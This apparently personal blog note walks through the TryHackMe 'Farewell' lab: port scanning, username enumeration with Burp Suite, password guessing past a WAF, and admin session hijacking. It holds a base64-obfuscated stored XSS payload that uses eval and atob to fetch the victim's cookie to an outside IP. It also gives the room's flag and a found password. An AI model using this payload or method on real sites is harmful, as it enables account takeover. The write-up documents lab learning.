---
created: 2026-01-18
tags:
  - note
  - journal
  - cyberStuff
title: Farewell
draft: false
date:
subiect:
  - waf 
  - web
  - prisEsc
dificultate: 3
amuca: true
link:
  - https://tryhackme.com/room/farewell
lastmod: 2026-01-21T12:49:33.957Z
---
# Reconing

Lets start with the basiscs to see what ports are open\
lets scna the ports with nmap and sS flag for\
-sS means Half-Open scan , is a scan quite fast and silent scan which scans for TCP SYN\
https://en.wikipedia.org/wiki/Transmission\_Control\_Protocol\
https://en.wikipedia.org/wiki/SYN

![](/images/blog-ul-meu/static/Pasted%20image%2020260118094415.png)\
very basiscs ports open , ssh and https , lets check the site

![](/images/blog-ul-meu/static/Pasted%20image%2020260118094453.png)\
nothing interesting here just a basic login page\
![](/images/blog-ul-meu/static/Pasted%20image%2020260118145315.png)\
apart from that we can find an interesting banner at the top of the site with some active users , maybe we can try some of the mfor the username

lets try a basic subdir enumeration maybe something interesting show up

![](/images/blog-ul-meu/static/Pasted%20image%2020260118100108.png)\
ok really good e have some good statussus here

lets try a burp suite interceptor

![](/images/blog-ul-meu/static/Pasted%20image%2020260118101550.png)\
now lets try to log in with it\
![](/images/blog-ul-meu/static/Pasted%20image%2020260118102022.png)\
i catch it and send it to the repeater and we see the error=auth\_failed

trying a username from above and a random pass i get the following ![](/images/blog-ul-meu/static/Pasted%20image%2020260118145649.png)\
lets try some other usernames to\
![](/images/blog-ul-meu/static/Pasted%20image%2020260118145721.png)\
ok cool\
lets try also deliver11\
![](/images/blog-ul-meu/static/Pasted%20image%2020260118145757.png)\
ok cool , this is the easieste password we can  get\
the capital of japan is Kyoto , so the formal will be KyotoXXXX where X is a digit

i guess we will try yo bruceforce it

Reconsidering it , taking in consideration the WAF , the bruteforce for the format XXXX will take quite some time so lets try something for admin

after a few trying a got lucky and found "Farewell2025!"

logining in with that pass we get\
![](/images/blog-ul-meu/static/Pasted%20image%2020260118150802.png)\
so there is the flag\
note: this will be the flag for a normal user

for the second flag we will try same aproach we used for the second WAF ctf , that being using eval and atob functions

the payload is

```
<body onload="eval(atob('ZmV0Y2goJy8vMTkyLjE2OC4xNDUuNC8nK2RvY3VtZW50LmNvb2tpZSk='))">
```

where the encodede part is :\
f`etch('//YourIP/'+document.cookie)`

and by pasting the payload into the post section we get the second cookie just like that

![](/images/blog-ul-meu/static/Pasted%20image%2020260118152529.png)

![](/images/blog-ul-meu/static/Pasted%20image%2020260118152610.png)\
and by changing out cookie with that we get\
note u have the change the cookie in admin.php page

![](/images/blog-ul-meu/static/Pasted%20image%2020260118153156.png)

FLAG:THM{ADMINP@wned007}
